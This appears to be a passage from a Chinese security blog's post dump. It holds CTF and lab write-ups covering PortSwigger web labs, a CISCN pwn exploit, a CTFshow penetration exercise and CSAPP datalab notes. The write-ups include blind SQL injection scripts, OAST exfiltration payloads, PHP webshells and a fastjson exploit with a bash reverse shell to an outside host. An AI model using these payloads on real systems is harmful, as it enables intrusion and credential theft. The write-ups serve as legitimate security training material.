#!/usr/bin/env python3file = open('./1.txt', 'r')lines = file.readlines()for line in lines: print('&quot;{}&quot;,'.format(line.strip()))file.close() 别问，问就是Office那些还不太会用 Lab: 2FA broken logic这个实验我tm爆破了五次，有时候参数传错了，有次忘记爆破完了，没去交答案。。。无语了 主要利用方法就是因为，我们可以用自己的账户去登录，然后改验证用户时的那个user cookie，再去爆破用受害者用户发送的验证码 真的好难等。。 重置密码1.使用邮箱重置如果将新密码直接发送给用户邮箱，这是很蠢的行为，很容易遭到中间人窃取，因为有些用户的信息会在多端同步，所以电子邮箱重置一般认为是不安全的 2.使用URL重置 有些网站在提交重置密码表单，并不会验证token，所以hacker可以直接删除token验证，重置任意用户密码 Lab: Password reset poisoning via middleware这个实验，重置密码的token是动态生成发给邮箱，但是他会发给指定HOST字段的域名，所以我们可以利用X-Forwarded-Host来修改我们自己服务器的域名，可以接收到发给其他用户的重置密码的token 有了这个就可以重置受害者的密码，类似于XSS攻击的利用 Lab: Password brute-force via password change有时候用户需要更改密码，而有些情况是，系统不强制要求只能更改当前登录用户的密码，然后根据某个参数名定位用户，因为输入错误当前密码和输入正确当前密码但是两次验证新密码错误，两者提示不一样，可以通过爆破来判断某个用户的旧密码 Lab: Password reset poisoning via dangling markup这个主要是利用一个XSS点去打，得到发送到用户的邮件(因为之前那个评论的xss点被过滤了 我们发现，虽然改了HOST服务器会返回错误，但是我们可以改任意端口，发现也是可以访问的Host: ac231fcd1ebf78a2c0da32e500e90045.web-security-academy.net:6666，然后我们可以查看到邮件有个view raw，发现这里的html并没有进行过滤，我们可以利用类似这样的payload去打&quot;&gt;&lt;img src=&quot;//exploit-ac101fda1e5a7810c09632bf012200cf.web-security-academy.net/?，这叫做Dangling markup injection在后面的xss攻击中会讲到 之后就可以在自己服务器的log中查看到密码 这个专题就做完了，除了那个2FA的爆破。。。太慢了，我不配做","link":"/2022/03/06/burp_authentication/"},{"title":"Burpsuite靶场---目录穿越专题","text":"目录穿越专题 目录穿越读取任意文件0x1利用返回上级目录符..来穿越 比如一个url?filename=test.jpg，写过点代码的都知道图片放在当前类似image的目录下，结合linux的文件管理，这张图的绝对路径就是/var/www/image/test.jpg 于是我们就可以这样拼接?filename=../../../etc/passwd实现任意文件读取 0x2 禁用了..符如果不能用..我们也可以尝试直接传绝对路径?filename=/ect/passwd 0x3 有过滤会对我们传入的../进行清除过滤，但是只会过滤一次，我们可以采用双写绕过 0x4 二次URL解码当网站对输入做了正则匹配，我们可以考虑用url编码进行绕过，这样在正则的时候不会被匹配到，但是到服务器时，又对我们输入做了解码，成功利用 这里可以用burp自带的fuzz字典进行一个爆破 0x05 匹配以预期的路径有些程序他只匹配你是否以他预期的路径文件开头，而不去对后面的做防护，一样的思路绕过 0x06 %00截断看题目描述是会判断是否为图片文件格式的后缀结尾，但是在后端验证时，当读到00空字符就不会继续读下去，所以我们利用如下的payload 预防&amp;&amp;总结如何防御文件穿越漏洞 设置白名单，仅允许传入路径中允许包含的字符和数字 验证输入后，使用文件平台的API来规范路径，看是否以预期基本目录开头 burp给了一段演示代码（java） File file = new File(BASE_DIRECTORY, userInput);if (file.getCanonicalPath().startsWith(BASE_DIRECTORY)) { // process file} 这个专题只有6个实验，也都比较简单，可以考虑和文件上传漏洞结合起来","link":"/2022/03/10/burp_dir_tra/"},{"title":"Burpsuite靶场----SQL注入专题","text":"这里主要是个人笔记，记录一些我个人要记录的点，不算是完整的write up burpsuite给了一个很好的各种sql语句差别的整合 https://portswigger.net/web-security/sql-injection/cheat-sheet Lab: SQL injection attack, querying the database type and version on Oracle在oracle数据库中，每个select语句后都必须指定选择的表名，恰好oracle中有一个内置的dual表 可以尝试这样 ' union select 'lnk','zing' from dual -- 查询oracle数据库版本 SELECT banner FROM v$versionSELECT version FROM v$instance payload ' union select banner,'cnc' from v$version -- SQL injection attack, listing the database contents on Oracle查询oracle数据库的的表和段 SELECT * FROM all_tablesSELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE' Lab: Blind SQL injection with conditional responses盲注脚本 其实用burpsuite跑很快就跑出结果了，python会慢一些，但是burp不能把字符串拼接起来 import requestsdef blind_sql_injection(url, length): password = '' headers = {} for i in range(1, length+1): base_cookie = f&quot;TrackingId=XN8KvPf0TbIGabZ6' and (select ascii(substring(password, %s, 1)) from users where username='administrator' )='[char]' --; session=aMdbiac40Bds8bKv3FE85vvVBsjwscrK&quot; % str(i) for j in range(48, 123): print(&quot;payload--&gt;digit:%s with &quot; % str(i), chr(j)) cookie = base_cookie.replace(&quot;[char]&quot;, str(j)) headers['cookie'] = cookie r = requests.get(url, headers=headers) if &quot;Welcome back&quot; in r.content.decode('utf-8'): password += chr(j) break print(&quot;password--&gt;&quot;, password)url = &quot;https://ac241fb81ede6a4cc09132c900460036.web-security-academy.net/&quot;blind_sql_injection(url, 20) 这里我就只截一部分图了，懒得跑下去了，太慢了 Lab: Blind SQL injection with conditional errors错误条件的盲注 首先加单引号报错，然后加个注释发现正常，所以判断SQL语句为 select trick_id from trick_tab where trick='vQdcV0dBQuBUyGx9' 然后判断数据库，首先查询一个空值 ' union select '' -- 然后尝试oracle的dual表 ' union select '' from dual -- 页面正常，所以数据库为oracle 接着我们尝试去一个不存在的表中查询，发现又报错，这个很明显后端在把我们输入的语句当作代码执行 select '' from lnk 这题和上面类似，只是将响应字符串取代为报错响应 于是我们参考构造payload ' union select case when(1=1) then to_char(1/0) else null end from users -- 值得注意的是，当when中条件为真时，返回500，为假时，页面才是正常，这和上面刚好是相反的 一样的，首先用burp爆破出密码长度 ' union select case when(username='administrator' and length(password)=1) then to_char(1/0) else null end from users -- 结果如下，长度是20 exp import requestsdef blind_sql_injection(url, length): password = '' headers = {} for i in range(1, length + 1): base_cookie = f&quot;TrackingId=PnmnAqssW0voE21g' union select case when (username='administrator' and ascii(substr(password, %s, 1))=[char]) then to_char(1/0) else null end from users --; session=ZTFD8NTb6aoJjWU0ENRuwMHso9ySKox2&quot; % str(i) for j in range(48, 123): print(&quot;payload--&gt;digit%s with &quot; % str(i), chr(j)) cookie = base_cookie.replace(&quot;[char]&quot;, str(j)) headers[&quot;cookie&quot;] = cookie r = requests.get(url, headers=headers) if 500 == r.status_code: password += chr(j) break print(&quot;password--&gt;&quot;, password)url = &quot;https://ac6d1f6a1ea307acc1c50c14006000ca.web-security-academy.net/&quot;length = 20blind_sql_injection(url, length) Lab: Blind SQL injection with time delays and information retrieval时间盲注，用burp cheat sheet给的payload fuzz下数据库，发现是PostgreSQL 接着用类似的payload测试延时注入 ' || (select case when (1=1) then pg_sleep(1) else pg_sleep(0) end from users) -- burp测试一下，password长度还是20 ' || (select case when (username='administrator' and length(password)=20) then pg_sleep(1) else pg_sleep(0) end from users) -- 这里python脚本的timeout和sleep不太一样，我暂时还爆破不出来，如果有知道的师傅希望能告诉我一下（🏀⚽️了 用burp爆破只能开1个线程，开多了也会导致有错误，反正就挺恶心挺费时的这题 payload '+||+(select+case+when+(username='administrator'+and+substring(password,§1§,1)='§a§')+then+pg_sleep(2)+else+pg_sleep(0)+end+from+users)+-- Lab: Blind SQL injection with out-of-band interaction利用带外(OAST)技术发动盲注点击burp的Burp Coolaborator client生成一个临时地址，发送给你的好友，他们点击之后就会收到一些信息 看ua头可以看到对方的一些设备基本信息 TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//YOUR-COLLABORATOR-ID.burpcollaborator.net/&quot;&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual-- 这个是burp给的一个payload模板，打过去就可过这个lab 第二个实验就是用oast技术泄漏出信息 我们可以在上面模板中的域名里写入sql语句带出查询的数据 payload x'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;%3fxml+version%3d&quot;1.0&quot;+encoding%3d&quot;UTF-8&quot;%3f&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%25+remote+SYSTEM+&quot;http%3a//'||(select password from users where username='administrator')||'~cp5gpi5bar1xg1c1n8t3ehnk5bb1zq.burpcollaborator.net/&quot;&gt;+%25remote%3b]&gt;'),'/l')+FROM+dual-- 这样就带出了密码 二次注入burp的这张图很形象的展示了二次注入的基本利用 首先查询一个正常的，接着以分号为界，后面的又会被当作sql语句去执行 总结和检测sql注入以及防御 可以通过工具比如burp和sqlmap进行检测sql注入 添加单引号’等字符查看是否有报错信息 提交一些特定sql语句，输入一些基本的值和其他的值，观察系统页面响应是否有变化或者差异 利用bool条件or 1 = 1 和or 1 = 2判断页面响应是否不一样 提交一些触发延时的payload看页面响应是否同延时有关 利用OAST payloads ，监视是否有交互 一些sql注入的点 一些数据库的不同造成的差异依然是这个链接 防御 一般大部分的sql注入都可以通过预处理语句就是参数化查询来避免 完善白黑名单 关闭错误提示 统一编码 闭合可控的变量，并且转义 安装WAF 参考portswigger sql靶场 对MYSQL注入相关内容及部分Trick的归类小结 梨子带你刷burpsuite靶场系列之服务器端漏洞篇 - Sql注入专题 sql盲注python脚本","link":"/2022/03/02/burp_sql/"},{"title":"Burpsuite靶场---命令注入专题","text":"命令注入专题 0x01 Lab: OS command injection, simple case简单测试下，发现这里有注入点 0x02 Lab: Blind OS command injection with time delays这次注入没有回显内容，所以不能用echo等命令来测试，可以靠;ping -c 10 127.0.0.1;根据页面响应时间来判断是否存在命令注入 0x03 Lab: Blind OS command injection with output redirection刚刚说了可以进行盲注，但我们怎么看到想要的内容呢，答案就是重定向输出，利用这样的payload ;id&gt;/var/www/images/1.txt 然后再去访问 ?filename=1.txt 0x04 Lab: Blind OS command injection with out-of-band interaction利用nslookup命令去外带出回显 0x05 Lab: Blind OS command injection with out-of-band data exfiltration以下分隔符适用于Windows和Linux &amp; &amp;&amp; | || 以下命令分隔符仅适用于基于 Unix 的系统： ; 换行符（0x0a或\\n） 在基于UNIX的system上，还可以用这些命令实现执行 `injected command` $(injected command ) 防止注入 根据允许值的白名单进行验证。 验证输入是否为数字。 验证输入仅包含字母数字字符，不包含其他语法或空格。 永远不要将shell元字符转义处理，容易被绕过","link":"/2022/03/10/burp_os/"},{"title":"Burpsuite靶场---文件上传漏洞专题","text":"文件上传漏洞专题 Lab: Remote code execution via web shell upload没什么好说的，没有任何过滤，直接读 &lt;?php var_dump(file_get_contents('/home/carlos/secret'));?&gt; Lab: Web shell upload via Content-Type restriction bypass这个也是改下Content-Type就好了 Lab: Web shell upload via path traversal这个并不限制我们传入php文件，但是会把我们传入的可执行代码变成文本，但是这里有个文件上传的利用点 这样我们是可以在上一级目录里去执行任意代码 Lab: Web shell upload via extension blacklist bypass考一些不常见扩展名绕过 .phtml .PHp pht, phpt, phtml, php3,php4,php5,php6 Lab: Web shell upload via obfuscated file extension混淆文件名绕过，依然是bypass，这里我直接用00截断绕过了 Lab: Remote code execution via polyglot web shell upload有些不判断后缀，判断文件内容是否符合预期 可以改文件头绕过 GIF89a&lt;?php var_dump(file_get_contents('/home/carlos/secret'));?&gt; Lab: Web shell upload via race condition条件竞争，but，一定一定要记得最后GET请求要多一个换行，不然怎么也跑不出来 社区解答","link":"/2022/03/12/burp_file_upload/"},{"title":"CISCN 2019华南 PWN3","text":"解法 这题有两种解法 csu srop ret2csu .text:00000000004004E2 mov rax, 3Bh ; ‘;’.text:00000000004004E9 retn 程序中白给了一段gadgets，0x3b刚好对应execve，我们就可以调用它，然后通过rop构造另外三个参数 /bin/sh,0,0分别对应rdi, rsi, rdx leak addr首先我们通过sys_read读入字符串，但是我们不知道其位置，只知道是在栈上，于是我们就要泄漏栈地址并且拿到字符串输入的地址 这里我们可以通过gdb可以发现，我们输入的地址距离栈基址的偏移是固定的0x118 write打印出0x30个字节，可以看出从低地址开始打印0x20个字节后0x8就是栈基址，所以我们构造 payload1 = b'/bin/sh\\x00' + b'b' * 8 + p64(vul_addr)sd(payload1)rv(0x20)bin_sh = u64(rv(8)) - 0x118ms('bin_sh', bin_sh) 来泄漏出输入/bin/sh的地址，并且返回到vul函数，进行再一次的利用 csu之后就是打csu的部分了，这里可以去wiki上学习下或者参考其他师傅的wp expfrom pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'splitw', '-h']elf = ELF('./ciscn_2019_s_3')libc = ELF('/lib/i386-linux-gnu/libc.so.6')#io = process('./ciscn_2019_s_3')io = remote('node4.buuoj.cn', 29397)sl = lambda s : io.sendline(s)sd = lambda s : io.send(s)rv = lambda n : io.recv(n)rc = lambda : io.recv()ru = lambda s : io.recvuntil(s)def ms(name,addr): print(name + &quot;----&gt;&quot; + hex(addr))def debug(mallocr,PIE=True): if PIE: text_base = int(os.popen(&quot;pmap {}| awk '{{print }}'&quot;.format(p.pid)).readlines()[1], 16) gdb.attach(io,'b *{}'.format(hex(text_base+mallocr))) else: gdb.attach(io,&quot;b *{}&quot;.format(hex(mallocr)))vul_addr = 0x0000000004004EDpop6_ret = 0x00000000040059Amov3_call = 0x0000000000400580execve_call = 0x00000000004004E2sys_call = 0x0000000000400517pop_rdi_ret = 0x00000000004005a3payload1 = b'/bin/sh\\x00' + b'b' * 8 + p64(vul_addr)sd(payload1)rv(0x20)bin_sh = u64(rv(8)) - 0x118ms('bin_sh', bin_sh)# csupayload2 = b'/bin/sh\\x00' + b'a' * 8 + p64(pop6_ret)payload2 += p64(0) * 2 + p64(bin_sh+0x50) + p64(0) * 3payload2 += p64(mov3_call) + p64(execve_call)payload2 += p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_call)sd(payload2)io.interactive() SROPsignal机制 用户进程接到一个signal，将控制权给到内核层 内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及signal信息和sigreturn的系统调用地址，之后跳转到注册过的 signal handler 中处理相应的 signal 执行完signal handler，就跳转到内核层 内核恢复2中保存的进程上下文，并把控制权给到用户层 攻击思路我们可以在恢复进程上下文的时候，构造一个fake_SigFrame，就能控制寄存器来劫持程序流程 对于ctf题pwntools里是集成了框架,如上题 sigreturn = 0x00000000004004DAframe = SigreturnFrame()frame.rax = 59frame.rdi = bin_shframe.rsi = 0frame.rip = sys_callpayload2 = b'/bin/sh\\x00' + p64(0) + p64(sigreturn) + p64(sys_call) + bytes(frame)sd(payload2) 只需要改payload2那一部分，要注意指定context.arch = &quot;amd64&quot;","link":"/2022/03/03/ciscn_19_s_3/"},{"title":"Burpsuite---反序列化专题","text":"同样的哈，我只记录一些点，不是完整的wp Lab: Arbitrary object injection in PHP这里有个读文件的点 可以在文件名后加一个~来读其备份文件 这样我们就可以读到站点地图给的文件源码 很明显有个漏洞函数 function __destruct() { // Carlos thought this would be a good idea if (file_exists($this-&gt;lock_file_path)) { unlink($this-&gt;lock_file_path); } } 在对象销毁时会调用，unlink是删除文件，所以我们就可以构造 &lt;?phpclass CustomTemplate { private $lock_file_path = &quot;/home/carlos/morale.txt&quot;;}$a = new CustomTemplate(&quot;/home/carlos/morale.txt&quot;);var_dump(serialize($a)); 再base64编码传过去就可以删除指定文件 Lab: Exploiting Java deserialization with Apache Commons一个java反序列化的工具 https://github.com/frohoff/ysoserial 可以生成指定的payload Lab: Exploiting PHP deserialization with a pre-built gadget chain首先可以构造一个错误的cookie使其报错，然后发现可以看到框架信息Symfony Version: 4.3.6 知道框架及其版本就可以利用PHPGGC那个工具来实现rce的payload 然后对照抓包的那种格式用php写一个exp，要用url编码才可以 最后改掉原来的那个cookie发包出去就可以过了","link":"/2022/03/14/burp_unser/"},{"title":"CTFshow目标资产渗透认证","text":"RW02目标资产渗透认证 首先是访问给的靶标，看到帮助文档底部有Anonymous-Chat-Room 于是我们上谷歌搜，可以找到 https://github.com/ping-xiong/Chat-Room-for-Two/blob/master/Applications/chat/Events.php 尝试默认的后台账户密码，但是行不通，接着翻一下目录代码，发现了一个photo_upload if ((($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/gif&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/jpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/pjpeg&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/png&quot;) || ($_FILES[&quot;file&quot;][&quot;type&quot;] == &quot;image/x-png&quot;))){ if ($_FILES[&quot;file&quot;][&quot;error&quot;] &gt; 0) { echo &quot;无效文件&quot;; } else { $file_name = uniqid(); move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;], &quot;images/photo/&quot; . $file_name.$_FILES[&quot;file&quot;][&quot;name&quot;]); echo $file_name.$_FILES[&quot;file&quot;][&quot;name&quot;]; }}else{ echo &quot;无效文件&quot;;} 这个过滤等于没过滤，直接伪造一下就行 import requestsurl = &quot;https://i.am.ctfer.com/photo_upload.php&quot;files = { 'file': (&quot;1.php&quot;, open(&quot;../1.php&quot;, &quot;rb&quot;), &quot;image/jpeg&quot;),}resp = requests.post(url=url, files=files)print(resp.text) 拿到shell后，瞄了眼wp，不是在这个机器上提权，就没往提权研究了 想到之前的后台登录，我们翻login.php，发现了账户密码，直接登录，但是好像没啥用，不过给的账户是个163的网易邮箱，可以去登一下 可以翻到一篇入职通知的邮件，但是被加密了，尝试弱口令，发现是123456 然后就又多了两个目标，还有一个账号 其中一个是一个开放的vscode服务，可以直接通过terminal拿到root，但是也没用，说明里有说flag不在这，只能耐心审代码了。 注意到这个/c/t.php &lt;?phpdate_default_timezone_set(&quot;Asia/Shanghai&quot;);header('Content-type:text/json;charset=utf-8');error_reporting(E_ALL ^ E_NOTICE ^ E_WARNING);session_start();if ($_SESSION['log'] !== 'yes') { $result['result'] = 'notok'; $result['msg'] = '请登录'; echo json_encode($result, true); session_write_close(); exit();}session_write_close();require_once './f.php';$type = $_GET['type'];$t = $_POST['title'];$c = urldecode($_POST['content']);$d = $_POST['dat'];$a = $_POST['tag'];$edits = $_POST['editn'];$zhiding = $_POST['ifzd'];$fstr = '';$result['result'] = 'ok';function valid_date($date) { /*日期判断函数*/ if (preg_match(&quot;/^([0-9]{4})-([0-9]{2})-([0-9]{2})$/&quot;, $date, $parts)) { if (checkdate($parts[2], $parts[3], $parts[1])) return true; else return false; } else return false;}if ($type == 'submit') { if (!is_dir('./../p/')) { mkdir('./../p/'); } if (!file_exists('./../p/index.php')) { $strs = '&lt;?php $inn=0;$in=array();$tp=\\'\\';$tagi=array(); ?&gt;'; file_put_contents('./../p/index.php', $strs); } if ($edits == '' || $edits == 'undefined' || $edits == 'null') { /*新建文章*/ if (!empty($t) &amp;&amp; !empty($d) &amp;&amp; !empty($c)) { if (empty($a)) { $a = '日常'; } require './../p/index.php'; $datestr = substr($d, 0, 4) . &quot;-&quot; . substr($d, 4, 2) . &quot;-&quot; . substr($d, 6, 2); if (valid_date($datestr)) { $in[$inn] = $d; } else { $in[$inn] = date('Ymd'); } $tagi[$inn] = $a; if ($zhiding == 'yes') { $rtp = preg_replace(&quot;/\\t|,/&quot;, '', $tp); if (empty($rtp)) { $tp = $inn . ','; } else { $tp = $tp . $inn . ','; } } arsort($in); $inn = $inn + 1; file_put_contents('./../p/index.php', '&lt;?php $inn=' . $inn . ';$in=' . var_export($in, true) . ';$tp=\\'' . $tp . '\\';$tagi=' . var_export($tagi, true) . ';?&gt;'); if (valid_date($datestr)) { $fstr = '&lt;?php $ptitle=&quot;' . $t . '&quot;;$pcontent=\\'' . addslashes(htmlspecialchars($c)) . '\\';$pdat=&quot;' . $d . '&quot;;$tag=&quot;' . $a . '&quot;;$ptype=&quot;post&quot;;?&gt;'; } else { $fstr = '&lt;?php $ptitle=&quot;' . $t . '&quot;;$pcontent=\\'' . addslashes(htmlspecialchars($c)) . '\\';$pdat=&quot;' . $d . '&quot;;$tag=&quot;' . $a . '&quot;;$ptype=&quot;page&quot;;?&gt;'; } file_put_contents('./../p/' . ($inn - 1) . '.php', $fstr); changed(); $result['pid'] = ($inn - 1); } else { $result['result'] = 'notok'; $result['msg'] = '除了标签，其他内容不得为空.';........ .... }} else { $result['result'] = 'notok'; $result['msg'] = '请求错误';}echo json_encode($result, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);?&gt; 主要是这个地方 $fstr = '&lt;?php $ptitle=&quot;' . $t . '&quot;;$pcontent=\\'' . addslashes(htmlspecialchars($c)) . '\\';$pdat=&quot;' . $d . '&quot;;$tag=&quot;' . $a . '&quot;;$ptype=&quot;post&quot;;?&gt;';file_put_contents('./../p/' . ($inn - 1) . '.php', $fstr); 这里仔细点就能发现，因为$t可控，很容易就能吧前后闭合调，传入我们想执行的代码 &lt;?php$fstr = '';$t = &quot;\\&quot;;phpinfo();?&gt;&quot;;$c = &quot;%3d&quot;;$d = &quot;11&quot;;$a = 'tag';$fstr = '&lt;?php $ptitle=&quot;' . $t . '&quot;;$pcontent=\\'' . addslashes(htmlspecialchars($c)) . '\\';$pdat=&quot;' . $d . '&quot;;$tag=&quot;' . $a . '&quot;;$ptype=&quot;post&quot;;?&gt;';echo $fstr; 用python上传时要注意，他这里是要验证登录的，也就是a的路由，不过那是个默认口令，用他给的admin:123456就能登录 &quot;&quot;&quot;@Author: C4ry7nk&quot;&quot;&quot;import requestsurl = &quot;https://blog.ctfer.com/c/t.php?type=submit&quot;header = { &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36&quot;}Cookie = { &quot;PHPSESSID&quot;: &quot;1db2d15b63fec63ed5ea11cd7e43b2e1&quot;,}data = { # &quot;title&quot;: &quot;\\&quot;;phpinfo();?&gt;&quot;, &quot;title&quot;: &quot;\\&quot;;@eval($_POST['x']);?&gt;&quot;, &quot;dat&quot;: &quot;dat&quot;, &quot;content&quot;: &quot;%3d&quot;,}resp = requests.post(url=url, data=data, headers=header, cookies=Cookie)print(resp.text) 获得shell后，继续信息搜集，但是这个shell，应该是服务器有定时任务，会定时清理后门🐎，所以隔一会shell就断了。 探测这里就按wp的方法来吧，实际环境中要是不能上传工具，也可以利用shell脚本，或者wp那样手动ping，除了本机192.168.101.3还有个存活的192.168.101.2 漏洞点就是8090的fastjson &lt; 1.2.25的CVE-2017-18349，环境看上去应该就是vulhub的那个靶场环境 首先生成恶意的class public class fast { static { try { Runtime rt = Runtime.getRuntime(); String[] commands = {&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;bash -i &gt;&amp; /dev/tcp/vps/2333 0&gt;&amp;1&quot;}; Process pc = rt.exec(commands); pc.waitFor(); } catch (Exception e) { // do nothing } }} 编译成class文件，python起一个http服务 利用marshalsec启动jdni的监听 java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http://43.143.156.226/#fast&quot; 22222 再搞一个json文件，用curl发起请求 { &quot;a&quot;:{ &quot;@type&quot;:&quot;java.lang.Class&quot;, &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;b&quot;:{ &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi://vps:22222/Exploit&quot;, &quot;autoCommit&quot;:true }} curl -X POST -H 'content-type:application/json' http://192.168.102.2:8090/ -d @x.json 总结挺有意思的，出题人也花了心思的，相较于平常CTF来说确实贴近实战，第一期的时候可惜在考试，没来得及复现","link":"/2023/03/13/ctfshowst02/"},{"title":"Burpsuite---SSRF专题","text":"服务端请求伪造 Lab: Basic SSRF against the local server在这个实验，我们不能直接访问/admin的页面，但是我们可以找到stockApi发起的请求，于是我们就可以对其进行修改，伪造成由我们本地发起的请求 达到删除用户的目的 Lab: Basic SSRF against another back-end system针对后端的系统用户无法去直接访问，但是服务器可以发起请求，于是我们依然可以利用ssrf打 用intruder模块爆破1-255网段 Lab: SSRF with blacklist-based input filter若是有黑名单过滤，一些应用程序会阻止包含诸如127.0.0.1之类的主机名localhost或诸如/admin，我们可以考虑以下一些方法进行绕过 将127.0.0.1用2130706433, 017700000001, or 127.1来代替 使用双url编码或者大小写混写绕过 可以用spoofed.burpcollaborator.net来解析成127.0.0.1 Lab: SSRF with whitelist-based input filter基于白名单的绕过 先用一个@字符来判断url是否支持嵌入解析 http://baidu.com@emion.fun例如这样，就会解析@后面的网站 然后用#号去指定url片段 http://127.0.0.1%2523@stock.weliketoshop.net/admin/delete?username=carlos 注意要进行双url编码 达到bypass白名单的过程 Lab: SSRF with filter bypass via open redirection vulnerability如果程序中包含了重定向的漏洞，就可以绕过基于SSRF的过滤，直接将请求重定向到后端目标上 盲打的SSRF同sql注入一样，也可以采用OAST技术将数据外带出来 这个实验还要配合一个shellshock的漏洞CVE-2014-6271 （这里貌似只能执行woami这个命令，其他的带不出来。。。","link":"/2022/03/12/burp_ssrf/"},{"title":"CSAPP之Data","text":"[TOC] 1.bitXor根据书上练习题上的^操作 xor(a,b) =~a&amp;b | a&amp;~b 以及德摩根定律 $$¬(P∨Q)⟺(¬P)∧(¬Q)$$ xor(a,b)= ~a&amp;b|a&amp;~b = ~(~(~a&amp;b|a&amp;~b)) = ~(~(~a&amp;b)&amp;~(a&amp;~b)) 所以 int bitXor(int x, int y) { return ~(~(~x&amp;y)&amp;~(x&amp;~y));} 2.tmin返回补码最小值，且题目环境为32位 计算0x80000000 int tmin(void) { //-214783648 //-2^(32-1) return 1 &lt;&lt; 31;} 3.isTmax判断是否为补码最大值，是返回1，不是返回0 0111 1111 1111 1111 1111 1111 1111 1111 # 二进制7 f f f f f f f # 十六进制 tmin + tmax + 1 = 0;由题意x = 011111111x+1 = 100000000~(x+1) = 0111111111x ^ ~(x+1) == 0 ? 1 : 0;排除特例x = 11111111111...x + 1 = 000000000...~(x+1) = 11111111111...利用 !!~x == 0 int isTmax(int x) { //2^31-1 return (!(x ^ ~(x+1))) &amp; (!!~x);} 4.allOddBits4位 -&gt; 1010 -&gt; 0xA(num &amp; 0xA) ^ 0xA !=0 -&gt; num不等于0xA构造32位的maskAA = A | (A &lt;&lt; 4);AAAA = AA | (AA &lt;&lt; 8);mask = AAAA | (AAAA &lt;&lt; 16); wp如下 int allOddBits(int x) { int A = 0xA; int AA = A | (A &lt;&lt; 4); //8位 int AAAA = AA | (AA &lt;&lt; 8); //16位 int mask = AAAA | (AAAA &lt;&lt; 16); //32位 return !((x &amp; mask) ^ mask);} 5.negate正数取反加1，正好变成其对应的负数(补码表示)；负数取反加一，则变为其原码，即正数 /* negate - return -x * Example: negate(1) = -1. * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 5 * Rating: 2 */int negate(int x) { return ~x + 1;} 6.isAsciiDigit0x30 -&gt; 1100000x39 -&gt; 111001 判断//(x - 0x30 &gt;= 0) &amp;&amp; (0x39 - x &gt;= 0)利用上面的取反操作，+变-运算利用mask = 1 &lt;&lt; 31; // 0x80000000mask和上面的表达式做&amp;运算，取符号位判断正负， int isAsciiDigit(int x) { //(x - 0x30 &gt;= 0) &amp;&amp; (0x39 - x &gt;= 0) int mask = 1 &lt;&lt; 31; return !((x+(~0x30 + 1)) &amp; mask) &amp; !((0x39 + (~x + 1)) &amp; mask);} 7.conditional首先将x的bool值转换掩码，为全0或者全1 int mask = ~!!x + 1;若x为非0，mask为-1，位为全1，mask&amp;y返回y，~mask&amp;z返回0 int conditional(int x, int y, int z) { int mask = !!x; mask = ~mask + 1; return (mask &amp; y) | (~mask &amp; z);} 8.isLessOrEqual分情况讨论1.x == yint cond1 = !(x^y);2.符号相反先取出符号位判断int signX = x &gt;&gt; 31 &amp; 1;int signY = y &gt;&gt; 31 &amp; 1;fir. x- y+int cond2 = signX &amp; (!signY);//1sec. x+ y-int cond3 = (!signX) &amp; signY;//13.符号相同int mask = 1 &lt;&lt; 31;int cond4 = ((x + (~y+1)) &amp; mask);//1 这个感觉有点啰嗦了。。但是可以理解一下 这个题改了半天，个人感觉下面的做法更好理解一点。。 int isLessOrEqual(int x, int y) { //求个差值 int sub = y + (~x + 1); //求个差符号位,负数为1 int mask = 1 &lt;&lt; 31;//0x80000000 int flag = (sub &amp; mask) &gt;&gt; 31; //求两数的符号位 int signX = (x &gt;&gt; 31); int signY = (y &gt;&gt; 31); //符号相同返回0，符号不同返回1 int cmp = ((signY ^ signX) &gt;&gt; 31) &amp; 1; //1.若符号相同,则符号位应该为0 //2.若符号不同，signX应为1 return (!cmp &amp; !flag) | (cmp &amp; signX);} 9.logicalNeg* logicalNeg - implement the ! operator, using all of the legal operators except !* Examples: logicalNeg(3) = 0, logicalNeg(0) = 1 我们可以将题意理解为 if(x!=0)return 0;elsereturn 1; 于是我们就该想怎么判断x!=0; try：int a = 0101;int -a = 1011;int sign = 1 wp如下 int logicalNeg(int x) { int negX = ~x + 1; int sign = (negX | x) &gt;&gt; 31; return sign + 1;} 10.howMantBits这一题怎么说。。题目没看懂，前前后后也花了好久理解题意和wp， /* howManyBits - return the minimum number of bits required to represent x in * two's complement * Examples: howManyBits(12) = 5 * howManyBits(298) = 10 * howManyBits(-5) = 4 * howManyBits(0) = 1 * howManyBits(-1) = 1 * howManyBits(0x80000000) = 32 * Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt; * Max ops: 90 * Rating: 4 */int howManyBits(int x) { //通过这两步，若x为0就返回1位，是正数就保留，是负数就按位取反，这样同时去掉了符号位1，找到首位0 int flag = x &gt;&gt; 31; x = (flag &amp; (~x)) | ((~flag) &amp; x); int b16, b8, b4, b2 ,b1, b0; b16 = (!!(x &gt;&gt; 16)) &lt;&lt; 4;//16 x &gt;&gt;= b16; b8 = (!!(x &gt;&gt; 8)) &lt;&lt; 3;//8 x &gt;&gt;= b8; b4 = (!!(x 